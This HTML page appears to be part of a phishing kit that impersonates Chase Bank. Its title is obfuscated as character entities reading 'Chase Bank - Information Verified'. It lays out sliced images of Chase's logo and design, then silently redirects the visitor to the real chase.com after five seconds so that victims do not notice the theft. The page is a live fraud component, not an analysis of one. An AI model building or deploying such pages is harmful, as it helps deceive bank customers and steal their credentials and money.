<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#67;&#104;&#97;&#115;&#101;&#32;&#66;&#97;&#110;&#107;&#32;&#45;&#32;&#73;&#110;&#102;&#111;&#114;&#109;&#97;&#116;&#105;&#111;&#110;&#32;&#86;&#101;&#114;&#105;&#102;&#105;&#101;&#100;</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>	
<html><meta http-equiv="Refresh" content="05; url=https://www.chase.com/"></html>
<style type="text/css">
div#container
{
	position:relative;
	width: 1349px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>

</head>
<body>
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:156px; top:20px; width:992px; height:41px; z-index:0"><img src="images/b1.png" alt="" title="" border=0 width=992 height=41></div>

<div id="image3" style="position:absolute; overflow:hidden; left:162px; top:28px; width:140px; height:34px; z-index:1"><a href="#"><img src="images/logo.png" alt="" title="" border=0 width=140 height=34></a></div>

<div id="image4" style="position:absolute; overflow:hidden; left:995px; top:31px; width:151px; height:18px; z-index:2"><a href="#"><img src="images/h5.png" alt="" title="" border=0 width=151 height=18></a></div>

<div id="image14" style="position:absolute; overflow:hidden; left:158px; top:442px; width:1007px; height:132px; z-index:3"><img src="images/ch10.png" alt="" title="" border=0 width=1007 height=132></div>

<div id="image16" style="position:absolute; overflow:hidden; left:597px; top:482px; width:131px; height:16px; z-index:4"><a href="#"><img src="images/b11.png" alt="" title="" border=0 width=131 height=16></a></div>

<div id="image2" style="position:absolute; overflow:hidden; left:160px; top:86px; width:999px; height:379px; z-index:5"><img src="images/h13.png" alt="" title="" border=0 width=999 height=379></div>

<div id="image5" style="position:absolute; overflow:hidden; left:291px; top:184px; width:306px; height:20px; z-index:6"><img src="images/h14.png" alt="" title="" border=0 width=306 height=20></div>

<div id="image6" style="position:absolute; overflow:hidden; left:413px; top:286px; width:400px; height:100px; z-index:7"><img src="images/ch.gif" alt="" title="" border=0 width=400 height=100></div>

</div>

</body>
</html>
